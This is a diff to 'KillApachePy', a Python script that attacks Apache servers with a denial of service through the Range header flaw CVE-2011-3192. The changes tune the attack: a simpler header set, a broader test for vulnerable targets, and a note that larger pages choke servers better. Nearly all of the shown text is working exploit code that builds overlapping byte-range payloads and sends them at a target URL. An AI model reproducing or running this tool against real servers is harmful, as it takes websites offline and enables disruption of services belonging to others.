@@ -6,7 +6,7 @@ NAME        = "KillApachePy (Range Header DoS CVE-2011-3192)"
 VERSION     = "0.1c"
 AUTHOR      = "Miroslav Stampar (http://unconciousmind.blogspot.com | @stamparm)"
 LICENSE     = "Public domain (FREE)"
-SHORT       = "You'll typically have to wait for 10-20 iterations before first connection timeouts"
+SHORT       = "You'll typically have to wait for 10-20 iterations before first connection timeouts. Also, more complex/bigger the page the better."
 REFERENCE   = "http://seclists.org/fulldisclosure/2011/Aug/175"
 
 SLEEP_TIME      = 3     # time to wait for new thread slots (after max number reached)
@@ -47,19 +47,19 @@ def attack(url, user_agent=None, proxy=None):
             print "(i) Checking target for vulnerability..."
         payload = "bytes=0-,%s" % ",".join("5-%d" % item for item in xrange(1, RANGE_NUMBER))
         try:
-            headers = { 'Host': host, 'User-Agent': USER_AGENT, 'Range': payload, 'Accept-Encoding': 'gzip' }
+            headers = { 'Host': host, 'User-Agent': USER_AGENT, 'Range': payload }
             req = _MethodRequest(url, None, headers)
             req.set_method('HEAD')
             response = urllib2.urlopen(req)
             if check:
-                return 'byteranges' in repr(response.headers.headers)
+                return 'byteranges' in repr(response.headers.headers) or response.code == 206
         except urllib2.URLError, msg:
             if 'timed out' in str(msg):
                 print "\r(i) Server seems to be choked ('%s')" % msg
             else:
                 print "(x) Connection error ('%s')" % msg
-                if check:
-                    exit(-1)
+                if check or 'Forbidden' in str(msg):
+                    os._exit(-1)
         except Exception, msg:
             raise
 
@@ -95,7 +95,7 @@ def attack(url, user_agent=None, proxy=None):
         os._exit(1)
 
 def main():
-    print "%s #v%s\n by: %s\n\n(Note: %s)\n" % (NAME, VERSION, AUTHOR, SHORT)
+    print "%s #v%s\n by: %s\n\n(Note(s): %s)\n" % (NAME, VERSION, AUTHOR, SHORT)
     parser = optparse.OptionParser(version=VERSION)
     parser.add_option("-u", dest="url", help="Target url (e.g. \"http://www.target.com/index.php\")")
     parser.add_option("--agent", dest="agent", help="User agent (e.g. \"Mozilla/5.0 (Linux)\")")
